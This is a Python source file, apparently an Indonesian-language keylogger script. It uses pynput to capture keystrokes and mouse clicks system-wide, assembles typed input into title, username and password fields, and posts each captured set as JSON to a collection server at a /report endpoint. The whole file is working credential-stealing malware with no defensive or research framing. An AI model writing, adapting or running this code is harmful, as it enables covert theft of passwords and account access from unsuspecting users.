from pynput import keyboard, mouse
from datetime import datetime
import requests

SERVER_URL = "http://127.0.0.1:5000/report"

type_chars = []
form_data = {}
form_counter = 1
field_index = 0
is_login_page = True

def save_from_data(form_data_local, form_id):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data_to_send = {
        "timestamp": timestamp,
        "form_id": form_id,
        "data": {}
    }
    
    for key, val in form_data_local.items():
        data_to_send["data"][f"{form_id}.{key}"] = val

    try:
        response = requests.post(SERVER_URL, json=data_to_send)
        if response.status_code == 200:
            print("[+] Data Berhasil Dikirim ke Server Utama")
        else:
            print(f"[!] Data Gagal Terkitim ke Server Utama: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Error saat Proses Pengirim Data: {e}")
        
def submit_field():
    global type_chars, field_index, form_data, form_counter
    
    input_text = ''.join(type_chars).strip()
    if len(input_text) < 1:
        type_chars.clear()
        return
    
    print(f"[DEBUG] Field {field_index} input: {input_text}")
   
    if field_index == 0:
        form_data["title"] = input_text
    elif field_index == 1:
        form_data["username"] = input_text
    else:
        if "password" in form_data:
            form_data["password"] += input_text
        else:
            form_data["password"] = input_text
            
    type_chars.clear()
    field_index += 1
    
    if "title" in form_data and "username" in form_data and "password" in form_data:
        save_from_data(form_data.copy(), f"form{form_counter}")
        form_data.clear()
        field_index = 0
        form_counter += 1
        
def on_press(key):
    global type_chars
    
    try:
        if not is_login_page:
            return
        
        if hasattr(key, 'char') and key.char:
            type_chars.append(key.char)
            
        if key in [keyboard.Key.enter, keyboard.Key.tab]:
            submit_field()
            
        if key == keyboard.Key.backspace and type_chars:
            type_chars.pop()
            
    except Exception as e:
        print(f"[!] Error Key Press: {e}")
        
def on_click(x, y, button, pressed):
    if not is_login_page:
        return
    
    if pressed and type_chars:
        submit_field()
        
def start_keylogger():
    print("Start")
    
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)
    
    keyboard_listener.start()
    mouse_listener.start()
    
    keyboard_listener.join()
    mouse_listener.join()
    
if __name__ == "__main__":
    start_keylogger()